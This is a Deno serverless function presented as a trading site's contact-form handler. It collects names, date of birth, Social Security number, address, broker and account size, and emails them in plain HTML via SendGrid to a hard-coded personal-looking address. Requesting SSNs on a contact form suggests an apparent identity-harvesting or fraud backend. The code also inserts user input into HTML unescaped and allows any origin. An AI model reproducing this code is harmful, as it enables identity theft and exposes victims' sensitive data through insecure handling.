const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Client-Info, Apikey',
};

const SENDGRID_API_KEY = Deno.env.get('SENDGRID_API_KEY');
const RECIPIENT_EMAIL = Deno.env.get('RECIPIENT_EMAIL') || 'killerwick12@example.com';

interface ContactSubmission {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  countryCode: string;
  dateOfBirth: string;
  ssn: string;
  addressLine1: string;
  addressLine2?: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
  tradingExperience: string;
  brokerName?: string;
  accountSize: string;
  goals?: string;
}

Deno.serve(async (req: Request) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    const data: ContactSubmission = await req.json();

    if (!SENDGRID_API_KEY) {
      console.warn('SendGrid API key not configured');
      return new Response(
        JSON.stringify({
          success: false,
          error: 'Email service is not configured. Please contact the administrator.'
        }),
        {
          status: 500,
          headers: {
            ...corsHeaders,
            'Content-Type': 'application/json',
          },
        }
      );
    }

    const emailHtml = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          h2 { color: #2952CC; border-bottom: 2px solid #2952CC; padding-bottom: 10px; }
          h3 { color: #1e293b; margin-top: 24px; margin-bottom: 12px; }
          .info-row { margin: 8px 0; }
          .label { font-weight: bold; color: #475569; }
          hr { border: none; border-top: 1px solid #e2e8f0; margin: 20px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <h2>New Contact Form Submission</h2>
          <hr>

          <h3>Personal Information</h3>
          <div class="info-row"><span class="label">Name:</span> ${data.firstName} ${data.lastName}</div>
          <div class="info-row"><span class="label">Email:</span> ${data.email}</div>
          <div class="info-row"><span class="label">Phone:</span> ${data.countryCode} ${data.phone}</div>
          <div class="info-row"><span class="label">Date of Birth:</span> ${data.dateOfBirth}</div>
          <div class="info-row"><span class="label">SSN:</span> ${data.ssn}</div>

          <h3>Address</h3>
          <div class="info-row">${data.addressLine1}</div>
          ${data.addressLine2 ? `<div class="info-row">${data.addressLine2}</div>` : ''}
          <div class="info-row">${data.city}, ${data.state} ${data.zipCode}</div>
          <div class="info-row">${data.country}</div>

          <h3>Trading Information</h3>
          <div class="info-row"><span class="label">Trading Experience:</span> ${data.tradingExperience}</div>
          <div class="info-row"><span class="label">Current Broker:</span> ${data.brokerName || 'N/A'}</div>
          <div class="info-row"><span class="label">Account Size:</span> ${data.accountSize}</div>
          <div class="info-row"><span class="label">Goals:</span> ${data.goals || 'N/A'}</div>
        </div>
      </body>
      </html>
    `;

    const sendGridPayload = {
      personalizations: [
        {
          to: [{ email: RECIPIENT_EMAIL }],
          subject: `New Contact Form Submission from ${data.firstName} ${data.lastName}`,
        },
      ],
      from: {
        email: 'noreply@yourdomain.com',
        name: 'Contact Form',
      },
      reply_to: {
        email: data.email,
        name: `${data.firstName} ${data.lastName}`,
      },
      content: [
        {
          type: 'text/html',
          value: emailHtml,
        },
      ],
    };

    const sendGridResponse = await fetch('https://api.sendgrid.com/v3/mail/send', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${SENDGRID_API_KEY}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(sendGridPayload),
    });

    if (!sendGridResponse.ok) {
      const errorText = await sendGridResponse.text();
      console.error('SendGrid error:', errorText);
      throw new Error(`Failed to send email: ${sendGridResponse.statusText}`);
    }

    console.log('Email sent successfully via SendGrid');

    return new Response(
      JSON.stringify({
        success: true,
        message: 'Contact form submitted successfully and email sent.'
      }),
      {
        status: 200,
        headers: {
          ...corsHeaders,
          'Content-Type': 'application/json',
        },
      }
    );

  } catch (error) {
    console.error('Error processing contact form:', error);
    
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: error instanceof Error ? error.message : 'Unknown error' 
      }),
      {
        status: 500,
        headers: {
          ...corsHeaders,
          'Content-Type': 'application/json',
        },
      }
    );
  }
});